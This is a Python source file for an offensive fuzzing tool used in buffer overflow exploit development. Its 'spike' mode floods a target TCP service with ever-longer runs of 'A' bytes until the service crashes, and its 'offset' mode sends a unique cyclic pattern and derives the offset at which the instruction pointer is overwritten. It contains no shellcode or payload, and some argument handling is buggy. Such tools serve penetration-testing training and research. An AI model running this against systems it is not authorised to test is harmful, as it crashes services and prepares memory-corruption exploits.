'''
- Command line input

- Spike
    - Remote
    - Local
- Finding Offset

'''

import argparse
import socket
from sys import prefix
from time import sleep
from math import ceil

MAX_BYTES = 1024 * 1024  # 1MB


# Find out the amount of bytes it takes for the target program to crash
def spike(target: str, port: int, expect_resp: bool, stride: int, command_prefix: str, timeout_secs: int) -> int:
    payload = "A" * stride

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout_secs)
        sock.connect((target, port))
        while True:
            try:
                print("send %s bytes" % len(payload))
                sock.send((command_prefix + payload).encode("utf-8"))
                if expect_resp:
                    sock.recv(1024)
                payload += "A" * stride
                sleep(1)
            except Exception as e:
                print(e)
                return len(payload)


# Send a chunk of unique pattern'd data to target server
def send_chunk(target: str, port: int, command_prefix: str, sequence: str):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target, port))
        print("send %s bytes" % len(sequence))
        sock.send((command_prefix + sequence).encode("utf-8"))
        print("sent")
    le_hex = input("Enter EIP value:")
    # since windows uses little endian, the value is reversed
    #   e.g. 386F4337 => 8oC7 => 7Co8
    substr = bytearray.fromhex(le_hex).decode()[::-1]
    return sequence.find(substr)


def generate_unique_pattern(length) -> str:
    # A lazy sequence implementation of `pattern_create` from `rapid7/rex-text`
    # {UPPER, LOWER, NUMBER}
    # Unique iteration length = 26 * 26 * 10 * 3 = 20280
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lower = upper.lower()
    num = "0123456789"
    res = ""
    # In case the required length is over 20280
    iterations = ceil(length // 20280)
    for _ in range(iterations + 1):
        for u in upper:
            for l in lower:
                for n in num:
                    queue = [n, l, u]
                    while len(res) < length:
                        res += queue.pop()
                        if not queue:
                            break
    return res


parser = argparse.ArgumentParser(description="Dumb fuzzing tool")

# Arguments
# -- Mode --
parser.add_argument("--mode", type=str,
                    help="[required] attack mode: spike|offset")
# -- Target --
parser.add_argument("--target", type=str, help="[required] target server")
parser.add_argument("--port", type=int, help="[required] target port")

parser.add_argument(
    "-resp", type=str, help="whether the command would return a response. default true", default=True)
parser.add_argument("--timeout", type=bool,
                    help="[optional] timeout in seconds if program didn't respond. default 5", default=5)
parser.add_argument("--prefix", type=str,
                    help="[optional] command prefix. default empty", default="")
# -- Spike --
parser.add_argument("--stride", type=int,
                    help="[optional] number in bytes to increment for each spike iteration. default 100", default=100)
# -- Offset --
parser.add_argument("--length", type=int,
                    help="[optional] unique pattern of strings at given length to be sent. default 2000", default=2000)


args = parser.parse_args()

mode = args.mode.lower()
if mode == "spike":
    len_crash_bytes = spike(args.target, args.port,
                            args.resp, args.stride, args.prefix, args.timeout)
    print("Program crashed at %s bytes", len_crash_bytes)

elif mode == "offset":
    seq = generate_unique_pattern(args.length)
    offset = send_chunk(args.target, args.port, args.prefix, seq)
    print("offset is at", offset)

else:
    print("[ERROR] attack mode invalid")
